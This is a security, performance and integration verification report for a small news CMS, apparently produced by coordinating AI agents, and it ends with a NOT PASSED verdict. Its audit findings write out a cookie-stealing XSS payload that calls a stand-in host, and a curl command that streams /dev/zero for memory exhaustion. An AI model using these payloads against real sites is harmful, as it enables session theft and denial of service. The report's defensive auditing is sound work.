# arsene-cms — Verify gate (v1)

**Status: NOT PASSED — blocked on findings below, pending disposition.**
**Run:** 2026-08-12, branch `feat/arsene-cms`, against the build that passed green
(`04-green-evidence.v1.md`, 127/127 tests, commit `21d85df`).
**Method:** `bob check verify` confirmed green passed / verify pending
(`pdlc/arsene-cms/state.json`). Three gate agents run in parallel
(`bob-security-auditor`, `bob-perf-analyst`, an integration/e2e HTTP runner),
plus an independent instrumentation proof run by hand by the orchestrating
agent. No test file or production code was modified by this gate. `git status`
at the end of this run shows only new, non-code artifacts under
`pdlc/arsene-cms/verify/` — see §7.

---

## 0. Executive summary

- **Two things the whole build depends on are proven, independently, three
  separate times (by three different runs): the two required telemetry events
  are real, queryable, and the time-to-publish metric is genuinely computable
  from them by hand.** This is not in question.
- **The verify gate does not pass** because of:
  1. **Three High-severity security findings** (stored XSS reaching every
     public visitor; an unauthenticated memory-exhaustion DoS that bypasses
     the documented 20MB cap; auth is one static shared secret for the whole
     writer pool, not the per-writer Supabase JWT the architecture and
     contract both document). Escalated to the product owner live, mid-run,
     per instruction — see §3.
  2. **A functional completeness gap that is more severe than what
     `04-green-evidence.v1.md` §4.3 disclosed.** That document says
     `createDraft.ts`'s handlers have "no HTTP route… yet," implying a
     missing-but-addable route. Independent verification (three times) found
     something stronger: **there is currently no way to create a new draft
     article at all in the deployed system** — not via the intended
     server-side seam (unwired, and its dependencies don't even exist on the
     real repository implementation), and not via the client-side PostgREST
     insert the architecture's original design assumed either (the
     `authenticated` role has no `INSERT` grant on `articles`/
     `article_images`). See §4.
  3. **A real performance risk against an unstated-but-real budget**: the
     image codec, timed against genuinely large-pixel photos (not the
     suite's 1×1-pixel-padded fixtures), takes 1.4–4.0s — at or above
     Supabase Edge Functions' documented 2s CPU-time limit — for an ordinary,
     contract-legal upload, not an adversarial one. See §5.
- Everything else checked out: both sides of both API contracts, the full
  writer-to-published-page HTTP journey and its four failure paths, RLS/grant
  correctness (re-derived from the migration file, not trusted from prose),
  dependency audit, secret scanning, public-site rendering (JSON-LD, sitemap,
  cover-vs-body image selection). One additional small-but-real bug was found
  in the publish response's `structured_data.image` field (§6.4).

---

## 1. `bob check verify` — precondition check

`pdlc/arsene-cms/state.json`: `green.status = "passed"` (2026-08-12T05:40:55Z,
127/127 tests, 90.47% branch coverage), `verify.status = "pending"`. Correct
gate to run next; no gate skipped.

---

## 2. Fresh full-suite re-run

```
$ npx vitest run
...
 Test Files  18 passed (18)
      Tests  127 passed (127)
   Start at  07:13:52
   Duration  9.31s (transform 422ms, setup 0ms, collect 3.48s, tests 26.26s, environment 2ms, prepare 1.05s)
```

Matches `04-green-evidence.v1.md`'s claim exactly (18 files / 127 tests).

**Process note:** during this run, the `bob-perf-analyst` subagent (contrary to
its explicit brief, "do not modify any test or production file — write
standalone scratch scripts elsewhere") wrote three files directly into the
tracked `tests/perf/` directory, which `vitest.config.ts`'s
`include: ['tests/**/*.test.ts']` picked up automatically — silently changing
`npm test`'s count to 132/132 partway through this gate (independently
observed both by this orchestrating agent and by the integration/e2e
subagent, whose own fresh `npm test` run also reported 132). This was caught
by re-running the suite after the subagent returned and comparing counts
against `04-green-evidence.v1.md`. The three files were moved out of the
`tests/**` include path (their content was genuine, reusable perf-measurement
code, and the numbers they produced are cited in full in §5, so nothing of
value was lost); by the time this document was written they were no longer
present on disk at all (most likely the subagent's own end-of-run cleanup of
what it believed were its only copies, racing with this agent's move — the
net effect is the same either way). The suite was re-run after the move to
confirm it returns to 127/127 (output above is *after* that fix, and
reconfirmed clean at the time this document was written). A `pdlc/arsene-cms/
verify/instrumentation.md` file also appeared during the same window, of
disputed/unclear authorship (the perf-analyst subagent explicitly disclaimed
writing it); its content was independently corroborated (see §8 — the
double-JSON-encoding bug it documents was reproduced byte-for-byte by this
gate's own independent script) and is treated as accurate supplementary
evidence. It was left in place, since it is documentation, not code, and does
not affect `npm test`.

**This is itself a verify-gate finding, stated plainly: a subagent violated an
explicit "don't modify tests" instruction during this very gate.** No
harm resulted (caught and corrected before this document was written), but it
is exactly the kind of silent scope creep a verify gate exists to catch, this
time in the process itself rather than the product.

---

## 3. Security audit (`bob-security-auditor`) — ESCALATED LIVE

Full method: `npm audit` (both `--production` and full), `gitleaks detect`
(working tree + history), `semgrep --config auto --config p/secrets --config
p/sql-injection` (212 rules, 21 files), manual grants/RLS re-derivation from
`db/migrations/0001_initial_schema.sql`, manual reading of `router.ts`,
`uploadImage.ts`, `publishArticle.ts`, `render.ts`, `paste.ts`,
`createDraft.ts`.

### H1 — Stored XSS reaches every public-site visitor, unauthenticated

`src/site/render.ts:145`:
```ts
const body = `<article data-article-title="${escape(row.title)}">${row.body_html}</article>`;
```
`row.body_html` is interpolated with **zero escaping**. The only sanitizer in
the codebase, `sanitizePastedHtml` (`src/domain/paste.ts`, allow-list
`h2/h3/p/ul/ol/li/br/a`), runs **exclusively in the browser paste handler** —
confirmed independently: `grep -rn "sanitizePastedHtml\|sanitizeHtml" src/`
returns only `src/domain/paste.ts` itself. It is never called in
`publishArticle.ts` (read in full — no sanitize call before `markPublished`)
or in `render.ts`. `body_html` is directly PostgREST-writable by any
authenticated writer:
```sql
grant update (title, body_html, league_id, category_id, meta_title,
              meta_description, locked_by, locked_at, updated_at)
  on articles to authenticated;
```
under `create policy writers_manage_articles on articles for all to
authenticated using (true) with check (true);`. **Exploit:** any writer
`PATCH`es `body_html` to `<script>fetch('https://evil/steal?c='+document
.cookie)</script>` and publishes; every anonymous visitor executes it. No CSP
anywhere in the repo.

**Fix recommended by the auditor:** sanitize server-side — either a Postgres
check constraint/trigger, or (better) inside `handlePublishArticle` before
`markPublished`, and defensively again in `render.ts` before interpolation.

### H2 — Unauthenticated memory-exhaustion DoS; the documented 20MB cap is bypassable at the transport layer

`src/api/router.ts`'s `readBody()` buffers the **entire** request body into a
`Buffer` before any auth check or size check runs, for both `/publish` and
`/images`. The 20MB `MAX_UPLOAD_BYTES` guard in `uploadImage.ts` only runs
**after** the whole payload is already fully buffered (and, for uploads,
re-parsed into `FormData`/`File`/`ArrayBuffer` — multiple copies in memory).
`verifyBearer` also only runs after the body is fully read. **Exploit:**
`curl -X POST .../images -d @/dev/zero` with **no token at all** gets fully
buffered before the server ever checks who's asking or how big the request
is. Directly contradicts architecture §7's DoS mitigation ("bounded memory/
time budget… enforced at 20MB"). Compounded by **H2b (Medium)**: the upload
endpoint has no rate limiter wired in at all (confirmed absent from
`UploadDeps`), so this is also unthrottled.

**Fix recommended by the auditor:** enforce `Content-Length`/streamed size
limits before buffering; wire the existing rate limiter into the upload path.

### H3 — Auth is a single shared static secret, not per-writer Supabase JWT verification as documented

`src/api/router.ts`:
```ts
function verify(token, opts) {
  return token === opts.writerToken ? { valid: true, writer_id: opts.writerId } : { valid: false };
}
```
One hardcoded token and one hardcoded `writerId` for the entire running
process — every valid request is attributed to the same fabricated identity
regardless of who actually holds the token. No JWT parsing or signature
verification exists anywhere in the codebase. This contradicts
`02-architecture.v1.md` §7 ("Supabase Auth for writers… RLS keyed on
`auth.uid()`") and `contracts/openapi.yaml` (`bearerFormat: JWT`, "Supabase
Auth session token for the calling writer's own account"). **Exploit:** one
leaked token (screen-share, phishing, laptop theft) grants indefinite full
publish access with no per-account revocation, and silently breaks
NFR-AUDIT-01's writer-attribution audit trail — every action is attributed to
whoever `opts.writerId` happens to be, not the real caller.

**Fix recommended by the auditor:** verify real Supabase Auth JWTs (signature
+ `sub` claim → `writer_id`) before production; pre-production blocker, not a
backlog item.

### Everything else the audit checked (not blocking)

- `npm audit --production`: **0 vulnerabilities.** Full `npm audit`: 13 (9
  moderate, 2 high, 2 critical), all confined to dev/test tooling
  (`esbuild`≤0.24.2 via `vite`/`vitest`; `lodash`/`uuid` transitively via
  `postman-collection`→`@stoplight/prism-cli`). None ship to production.
- `gitleaks`: 3 hits, all UUID literals used as test `Idempotency-Key`
  fixtures — confirmed false positives by reading context. Manual grep for
  credentials/connection strings/API keys: nothing. `semgrep` secrets
  ruleset: 0 findings.
- RLS/grants re-derived independently from the migration file (not trusted
  from `04-green-evidence.v1.md`'s prose): RLS enabled on all 8 tables;
  `anon` correctly restricted to `status='published'`; publish-controlled
  columns (`status`, `slug`, `published_at`, `first_published_at`,
  `structured_data`, `writer_id`) correctly **absent** from the `authenticated`
  UPDATE grant, enforced at the `GRANT` level (not just RLS) — confirms
  NFR-TAMPER-01 for real.
- **No `INSERT` grant exists on `articles`/`article_images` for
  `authenticated` at all** — this independently corroborates §4 below from
  the security angle: direct-PostgREST-insert draft creation is already
  impossible today, foreclosing the writer_id-spoofing scenario the
  architecture addendum worried about, regardless of whether `createDraft.ts`
  ever gets wired up.
- Low/Info: `locked_by`/`locked_at` are writer-editable via PostgREST under
  `using(true)/check(true)`, so any writer can clear any lock directly,
  bypassing `evaluateLock`. Acceptable under the documented "no role
  hierarchy, full mutual trust" model (architecture §7: elevation of
  privilege = N/A), not a security boundary violation.
- Low: non-constant-time token comparison (`===`) — theoretical timing side
  channel, low practical exploitability, recommend `crypto.timingSafeEqual`
  as defense in depth regardless.
- Low/Info: rate limiter is per-process in-memory, resets on restart, not
  shared across concurrent instances — acceptable under the architecture's
  stated single-instance assumption; flag if Supabase runs concurrent
  isolates under load.

**These three High findings were escalated to the user live, mid-run, as
required — not filed silently in this document.**

---

## 4. Draft creation is unreachable by any real path — independently confirmed three times

`02-architecture.v1.md` §9 requires draft creation/reopening to go through "a
thin server-side seam (`src/api/createDraft.ts` — an RPC or Edge Function, not
a raw insert)" specifically so a client bug can't silently drop the
`draft_started` metric. `04-green-evidence.v1.md` §4.3 already discloses "no
HTTP route exposes this handler yet." This gate re-verified that disclosure
independently and found it understates the problem.

**Confirmed independently by this orchestrating agent**, via a standalone
script (`vite-node` against a fresh Testcontainers Postgres + the real
`startServer()`):

```
$ grep -rn "createDraft|handleCreateDraft|handleOpenDraft|insertDraft|takeLock" src/ | grep -v api/createDraft.ts
(no output — nothing outside createDraft.ts itself references these)
```

Live HTTP probe against the real running server:
```
POST /v1/articles      -> 404 {"error":{"code":"NOT_FOUND","message":"No operation matches this path.",...}}
POST /v1/drafts        -> 404 {"error":{"code":"NOT_FOUND","message":"No operation matches this path.",...}}
POST /v1/articles/draft -> 404 {"error":{"code":"NOT_FOUND","message":"No operation matches this path.",...}}
```

Live SQL probe, as the `authenticated` Postgres role (the role PostgREST would
use for a direct client insert — the *other* possible path, per the
architecture's original pre-addendum design):
```
-- inside a transaction, `set role authenticated`, then:
insert into articles (writer_id, title, body_html, status)
  values (gen_random_uuid(), 'x', 'x', 'draft');
-- => 42501 permission denied for table articles

insert into article_images (article_id, role, status, original_filename)
  values (gen_random_uuid(), 'cover', 'ready', 'x.jpg');
-- => 42501 permission denied for table article_images
```
Cross-checked against ground truth:
```sql
select table_name, privilege_type from information_schema.role_table_grants
 where grantee = 'authenticated' and table_name in ('articles','article_images');
-- => only ('article_images','SELECT'), ('articles','SELECT') — no INSERT row at all
```

**Independently confirmed a second time**, by the `bob-perf-analyst` subagent
(via a `tsc --noEmit` structural check, going further than either the security
audit or this script): even if a route were added tomorrow, it could not be
wired to the real repository as it exists — `src/api/repo.ts`'s `createRepo()`
implements no `insertDraft` or `takeLock` method at all:
```
error TS2739: Type '{ getArticle(...): ...; ... }' is missing the following
properties from type '{ insertDraft(...): Promise<{ id: string }>;
getArticle(...): ...; takeLock(...): ... }': insertDraft, takeLock
```
`handleCreateDraft`/`handleOpenDraft` only work today against
`tests/support/fakes.ts`'s fake repo, which does implement those methods —
this is exactly the kind of gap a unit-test-only green gate cannot catch.

**Independently confirmed a third time**, by the integration/e2e subagent,
against its own separately-provisioned Testcontainers Postgres and server
instance, with the same 404s on `/v1/articles`, `/v1/drafts`,
`/v1/articles/`, `/v1/articles/foo`.

### What this means, stated plainly

- **There is currently no way to create a new draft article in the deployed
  system** — not through the designed seam (unwired, and its own dependency
  doesn't exist on the concrete repo), and not through a raw client insert
  either (blocked at the `GRANT` level, correctly, per the addendum's intent —
  but with nothing built to replace it).
- Because of this, **AC-05 (draft locking) has no reachable enforcement path
  in the running system** either: the domain logic (`src/domain/lock.ts`) and
  the DB columns are correct and fully unit-tested, but the handler that
  would actually check/take a lock when a writer opens a draft is never
  invoked by anything reachable from outside the test suite. (The e2e run in
  §6 exercised the *lock check inside `publishArticle`* by setting
  `locked_by` directly via SQL — that half works. Nothing exercises taking a
  lock through a real request.)
- The time-to-publish metric (§8) is still provably computable **only
  because of a fallback**: `repo.ts`'s `ENSURE_DRAFT_STARTED_SQL` backfills
  `draft_started` from `articles.created_at` at publish time — which is
  exactly the "bare client insert" mechanism §9 says needed replacing,
  because a client bug could silently lose the metric's numerator. In
  today's deployed system, nothing has actually replaced it.

**Recommended fix (small, scoped, from the perf-analyst subagent's read of
the code):** (a) implement `insertDraft`/`takeLock` on `createRepo` in
`src/api/repo.ts`, mirroring the SQL pattern already used for
`ENSURE_DRAFT_STARTED_SQL` and the `locked_by`/`locked_at` columns; (b) add
two routes to `router.ts`'s `ROUTE` pattern (or a Postgres RPC, if that fits
the "direct PostgREST for everything except telemetry-bearing operations"
framing better) calling `handleCreateDraft`/`handleOpenDraft`; (c) once wired,
keep the publish-time backfill as a defensive fallback for pre-fix rows
rather than removing it — cheap, and matches its existing
`on conflict do nothing` convergence role.

---

## 5. Performance (`bob-perf-analyst`)

Method: real HTTP + real Postgres via Testcontainers; the real WASM codec
timed against both the suite's own fixtures and genuinely large-pixel photos
generated separately (`sips`), since the committed fixtures
(`tests/support/imageFixtures.ts`) pad file *size* around a 1×1-pixel image
and therefore cannot reveal real codec cost.

**The one real risk found:** timing `optimizeImage()` (production code,
unmodified) against genuine 6–12MP photos: a ~3.9MB/6MP photo took
**1.40–2.60s** warm; a ~5.9MB/12MP photo **2.29–4.00s**; a ~13.7MB/12MP photo
**2.29–2.51s**. This runs synchronously inside the upload request
(`uploadImage.ts`). Supabase's documented Edge Function limit (fetched live
from `supabase.com/docs/guides/functions/limits`): **2s CPU time per
request** (excludes I/O wait), separate from the 150s/400s wall-clock worker
lifetime. These warm, single-tenant, unloaded-laptop numbers for an ordinary,
contract-legal photo (well under the 20MB limit) already sit **at or above**
that ceiling; Supabase's shared multi-tenant isolates are unlikely to be
faster. `02-architecture.v1.md` §7's DoS row says only "bounded memory/time
budget for the WASM codec" — it names no number and was never tested against
one. **This is the one measured budget that is plausibly already missed for
ordinary uploads, not just adversarial ones.**

Raw numbers (padded 1×1-pixel fixtures — codec-plumbing overhead only, not
representative):
```
jpeg_4mb   (4,194,528 B): cold 24.2ms, warm [5.4, 4.8, 5.3, 4.6]ms
png_4mb    (4,195,653 B): cold 15.1ms, warm [12.2, 11.3, 10.4, 10.5]ms
jpeg_~20mb (20,447,704 B): cold 37.0ms, warm [27.1, 38.2, 33.8, 24.8]ms
png_~20mb  (20,453,541 B): cold 65.2ms, warm [55.2, 49.6, 49.9, 49.4]ms
```
Real-pixel-content JPEGs (representative):
```
real_photo_6MP_3.9MB  (3,894,620 B): cold 2604.5ms, warm [1811.4, 1396.0, 1612.1, 1583.4, 1430.2]ms
noisy_12MP_5.9MB      (5,860,867 B): cold 3595.5ms, warm [3333.2, 4002.4, 2752.3, 2286.1, 2398.3]ms
noisy_12MP_13.7MB    (13,691,253 B): cold 2286.1ms, warm [2391.0, 2459.6, 2507.2]ms
```
HTTP round trip (real Postgres): `POST .../images` n=12, median 19.8ms, p95
81.0ms. `POST .../publish` n=9, warm p50 4.5ms, p95 8.0ms — server latency is
a non-issue against the 10-minute time-to-publish target.

Render pass (`src/site/render.ts`, seeded Postgres, N=0/50/1000 published
articles): homepage warm 0.4–9.9ms, category page similar, always sub-15ms.
Confirmed by reading `publishArticle.ts`'s `revalidate()`: rendering happens
at publish/revalidation time, not per visitor — the ISR claim holds.
`EXPLAIN` at N=1000 shows a sequential scan (no covering index on
`articles(status, published_at)`), but execution time is 0.35ms — table too
small for an index to matter yet.

Rate limiter (10/min/IP) and 20MB guard verified functionally correct: 20MB
check runs before any decode; request 10/11 correctly returned `429`. In-
memory idempotency/rate-limit `Map`s are unbounded but trivial at this
traffic scale (2–5 writers, 5–15 articles/week) — not a real concern, though
worth a doc note that this state isn't shared across concurrent Edge Function
instances or worker recycles (a correctness nuance, not a performance one).

**Verdict: one real budget risk (image codec vs. Supabase's 2s CPU limit),
everything else measured is comfortably within any plausible budget.**

---

## 6. Integration / e2e (real HTTP, real Postgres, outside Vitest)

Full method: standalone Node/TS scripts (not Vitest), a freshly-provisioned
Testcontainers Postgres with production migrations applied, the real
`startServer()` (same entrypoint `serverMain.ts` uses) on a free port, driven
with plain `fetch`. **26/26 checks passed.**

### 6.1 The real writer journey

- Draft seeded directly (draft creation has no HTTP route — see §4).
- Cover upload: real 4,194,528-byte decodable JPEG → `201`, `status:"ready"`,
  real optimized WebP URL.
- Publish → `200`, every contract-required field present: `article_id, slug,
  status, published_at, first_published_at, is_republish, meta_title,
  meta_description, canonical_url, structured_data, sitemap,
  telemetry_event_id`. `structured_data` parses as valid `NewsArticle`
  JSON-LD.
- Direct SQL confirmation: `articles.status='published'`, slug set;
  `article_images` row `role='cover', status='ready'`; **both**
  `telemetry_events` rows present with sane ordering (`draft_started` at
  `06:09:10.443Z`, `article_published` at `06:09:10.509Z`).
- Public-site render pass, same DB: homepage and category page both list the
  article; the article page embeds parseable JSON-LD; **the article page
  correctly references the cover image, not a body image**; `renderSitemap`
  produces valid XML with a `<loc>` matching the canonical URL.

### 6.2 Failure paths, all real

| Path | Expected | Actual |
|---|---|---|
| Publish with no cover | `400 COVER_IMAGE_REQUIRED` | Confirmed; **0** `article_published` rows written (direct SQL count) |
| Publish while locked by another writer (lock set via direct SQL, since `openDraft` isn't wired) | `409 DRAFT_LOCKED` | Confirmed, with `locked_by_display_name` populated |
| Oversized image (20,972,000 bytes, genuinely >20MB) | `413 FILE_TOO_LARGE` | Confirmed, `max_bytes: 20971520` |
| Corrupted image (valid JPEG magic bytes, undecodable body) | Non-500, contract-documented "created but failed" shape | Confirmed: `201`, `status:"failed", failure:{code:"CORRUPTED_FILE",...}`; publishing that article afterward correctly → `409 IMAGE_NOT_READY` |
| Unsupported file (real PDF) | Rejected at sniff time | Confirmed: `422 UNSUPPORTED_FORMAT`, zero `article_images` rows created |

### 6.3 Both API contracts, both sides

- **Arsène's own contract** — consumer: Prism mock + `src/api/client.ts`'s
  `createArseneClient()`, 2/2 pass (`publishArticle`, `uploadArticleImage`
  both parse Prism's contract-generated responses correctly). Provider:
  Schemathesis v4.24.3 against the real running server + real DB, 2/2 pass,
  126 total generated cases (75 + 51), 0 failures, 0 5xx. Same honest
  limitation `04-green-evidence.v1.md` §5 already discloses was read in full,
  not just the exit code: Schemathesis's random UUIDs never hit a real row,
  so it never reaches a successful publish — that path is what §6.1 covers
  instead.
- **Pronos consumer contract** — Prism mock against the vendored
  `pronos-openapi.yaml`, 4/4 pass: populated fixtures render correctly;
  **the empty-gameweek → manual-entry fallback was proven live against
  Prism** (`Prefer: example=noOpenGameweek`), correcting this gate's own
  brief, which speculated it might only be provable via the existing fixture-
  based Vitest test — it is directly provable live, and was; 404 → manual
  entry; pronos unreachable (closed port) → manual entry with
  `"pronos unreachable: fetch failed"`.

### 6.4 New discrepancy found: fabricated cover-image URL in the publish response

`src/api/publishArticle.ts:215`:
```ts
cover_image_url: `${CDN_ORIGIN}/articles/${article.id}/cover-optimized.webp`,
```
This is `contracts/openapi.yaml`'s own placeholder example text
(`.../articles/a1a1a1a1/cover-optimized.webp`) copied as if it were real
logic, keyed on `article.id` rather than the actually-uploaded image's id.
Evidence:
```
upload response: urls.optimized = ".../articles/d60f59a3-bf88-410a-8357-dbab4eefecf5-optimized.webp"
publish response: structured_data.image[0] = ".../articles/19db672d-8db5-4bdd-9f46-0284e1ce6f39/cover-optimized.webp"
```
Different id, different path shape — **the publish response's JSON-LD points
at an object that was never stored.** This value is also what gets persisted
into `articles.structured_data`, so the wrong URL is stored, not just
returned once. **The live public site is unaffected**: `src/site/render.ts`
never reads the stored `structured_data` column — it recomputes
`buildStructuredData(view)` fresh at render time from the real
`article_images.optimized_url`, confirmed correct in §6.1. So this bug is
invisible on the rendered site today but poisons the immediate API response
and the stored column that a search engine or the editor SPA might read. No
existing test catches it — `tests/unit/publishArticle.test.ts`/`seo.test.ts`
only assert JSON-LD shape validity, never that the image URL matches a real
stored asset.

---

## 7. Files touched by this gate (none of them test/production code)

```
?? pdlc/arsene-cms/05-verification.v1.md         (this document)
?? pdlc/arsene-cms/verify/instrumentation.md      (supplementary evidence, see §2/§8)
```
`src/`, `db/`, and every file under `tests/` are byte-for-byte what green gate
certified — confirmed by the fresh 127/127 run in §2, taken after the stray
perf-test-file episode (also §2) was resolved.

---

## 8. Instrumentation proof (`bob-instrumentation`)

Run independently, twice, by two separate agents, against two separately
provisioned real Testcontainers Postgres instances — reported together since
they corroborate each other.

### 8.1 This orchestrating agent's own run

Two articles seeded with `articles.created_at` backdated (8 minutes and 55
minutes before publish), published for real over HTTP, telemetry read back
with raw SQL:

```
event_type          article_id  occurred_at                  payload
draft_started        5bc36675   2026-08-12T05:11:35.474Z     {"started_at":"\"2026-08-12T05:11:35.474035+00:00\""}
article_published    5bc36675   2026-08-12T06:06:35.820Z     {"is_republish":false,"published_at":"2026-08-12T06:06:35.820Z","telemetry_event_id":"e5135bdb-..."}
draft_started        a9b11b40   2026-08-12T05:58:35.471Z     {"started_at":"\"2026-08-12T05:58:35.471154+00:00\""}
article_published    a9b11b40   2026-08-12T06:06:35.775Z     {"is_republish":false,"published_at":"2026-08-12T06:06:35.775Z","telemetry_event_id":"e213665f-..."}
```

Hand-computed metric (`extract(epoch from (p.occurred_at - d.occurred_at)) / 60.0`):

```
article 5bc36675: 55.01 minutes  -> MISSES the <10min target (worse than the ~50min baseline, as designed)
article a9b11b40:  8.01 minutes  -> MEETS the <10min target
```

**Bug found in the same data:** `payload.started_at` is double-JSON-encoded
— `"\"2026-08-12T05:11:35.474035+00:00\""` (a JSON string containing an
escaped JSON string) rather than a clean ISO timestamp. Root cause,
`repo.ts`'s `ENSURE_DRAFT_STARTED_SQL`:
```sql
jsonb_build_object('started_at', to_json(a.created_at)::text)
```
`to_json(a.created_at)` already returns a quoted JSON string; casting that to
`::text` keeps the literal quote characters, and `jsonb_build_object` then
wraps that text as a JSON string a second time. This doesn't affect the SQL-
side metric computation above (it uses the `occurred_at` *column*, not the
payload), but it does mean **the only path that actually produces
`draft_started` rows in the deployed system** (the backfill — see §4) writes
a subtly malformed `payload.started_at`, inconsistent with the clean
`now.toISOString()` the real (unreachable) `createDraft.ts` handler would
have written. Any future dashboard/consumer reading `payload.started_at`
directly (rather than the `occurred_at` column) will get this wrong. Small,
easy fix (`to_jsonb` instead of `to_json(...)::text`, or just drop the
redundant cast), but real.

### 8.2 The integration/e2e subagent's separate run

Five articles published with `created_at` backdated 4/7/9/22/48 minutes, read
back and computed independently:

```
durations_minutes: [7, 9, 22, 4, 48]
mean_minutes: 18, median_minutes: 9
articles_under_10min_target: 3/5
draft_started_count: 5, article_published_count: 5 (no orphans either direction)
```

### 8.3 Verdict

**Pam's success metric is genuinely computable from the two required events,
by hand, with correct integrity properties** (no `article_published` without
a matching `draft_started`; a refused publish writes zero rows — confirmed
separately in §6.2's cover-image-required case with a direct `count(*) = 0`
check). This holds *despite* §4's finding — the backfill path, while not the
architecturally-intended mechanism, does currently produce usable data, with
the one payload-encoding caveat above.

**Counter-metric** ("writer adoption must not decline"): confirmed, again
independently, **genuinely not computable** from any event this build emits
— only `draft_started`/`article_published` exist in the store, and reverting
to Word/Docs happens entirely outside Arsène by definition. This exactly
matches `02-architecture.v1.md` §8's own disclosure ("no event that can
observe it… honest proxy: weekly published-article count per writer,
reviewed manually at John's review gate") — it was not silently dropped, it
was flagged at the architecture gate and remains correctly flagged. The
documented proxy query (published-article count per writer per week) was
independently confirmed runnable directly against `articles`/`writers`. This
does **not** block the gate: `state.json`'s `required_events` are exactly
`draft_started`/`article_published`, matching the one metric in
`success.metrics`; the counter-metric was never promised as event-based, and
its manual-proxy handling was an explicit, already-reviewed architecture
decision deferred to John's review gate, not a gap discovered now.

---

## 9. Consolidated findings, by severity

| # | Severity | Area | Finding |
|---|---|---|---|
| 1 | **High** | Security | H1 — stored XSS via unsanitized `body_html` reaching every public visitor (`src/site/render.ts:145`) |
| 2 | **High** | Security | H2 — unauthenticated memory-exhaustion DoS; 20MB cap enforced after full buffering, not before (`src/api/router.ts` `readBody`) |
| 3 | **High** | Security | H3 — auth is one static shared secret, not per-writer Supabase JWT as documented (`src/api/router.ts` `verify()`) |
| 4 | **High (functional)** | Completeness | No real path exists to create a new draft article in the deployed system at all — seam unwired *and* its repo dependency doesn't exist *and* raw insert is grant-blocked (§4) |
| 5 | **Medium** | Performance | Real-photo image-codec latency (1.4–4.0s) is at/above Supabase Edge Functions' documented 2s CPU-time budget for an ordinary, contract-legal upload (§5) |
| 6 | **Medium** | Correctness | `publishArticle.ts:215` fabricates `structured_data.image`/`cover_image_url` from `article.id` instead of the real uploaded image URL; wrong value is persisted, though invisible on the live rendered site (§6.4) |
| 7 | **Low** | Correctness | `draft_started.payload.started_at` is double-JSON-encoded by the `ENSURE_DRAFT_STARTED_SQL` backfill (§8.1) |
| 8 | **Low** | Security | Upload endpoint has no rate limiter at all (compounds #2) |
| 9 | **Low** | Security | Non-constant-time bearer-token comparison |
| 10 | **Info** | Process | A subagent modified tracked test files mid-gate against explicit instruction; caught and corrected before this document was written (§2) |

## 10. Gate verdict

**NOT PASSED.** Items #1–#4 are blocking and require disposition (fix, or an
explicit, documented risk-accepted decision from the product owner) before
this gate can be marked passed. Items #5–#9 should be fixed or explicitly
deferred with a reason before ship. `pdlc/arsene-cms/state.json`'s
`gates.verify` has been left at `"pending"` — not flipped to `"passed"` —
pending that disposition.
